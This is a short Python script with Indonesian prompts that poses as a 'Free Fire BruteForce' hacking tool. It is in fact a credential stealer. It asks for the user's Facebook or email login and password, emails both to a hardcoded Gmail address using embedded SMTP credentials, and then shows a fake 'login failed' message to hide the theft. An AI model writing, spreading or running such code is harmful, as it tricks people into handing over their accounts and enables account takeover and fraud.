import os,time
print('Menginstall Packet',end='\\r')
for i in range(10):     print('.',end='\\r')     time.sleep(0.5)
os.system('pip install yagmail')
os.system('pip install termcolor')
os.system('pkg install figlet') 
import yagmail
from termcolor import colored  
print(colored('Packet Selesai Di Install','green'))
os.system('clear')
os.system('figlet Free Fire BruteForce H4cK')
print(colored('Author:#b3r0Ok','yellow'))
print(colored('[!]Login Di Perlukan Untuk Mendapatkan Id Teman','green'))
h = input(colored('Email/FB: ','red'))
j = input(colored('Password: ','white')) 
uwu = yagmail.SMTP('testedakun283@gmail.com','fukyou123#' )
body = ('Email/Fb: '+h,'Passwordnya: '+j) 
subject = 'Dapet Akun Dari Bocah Tolol' 
uwu.send('azharbasechannel@gmail.com',subject,body) 
print(colored('[!]Maaf Gagal Login,Cek Password Atau Ulangi Lagi','red'))
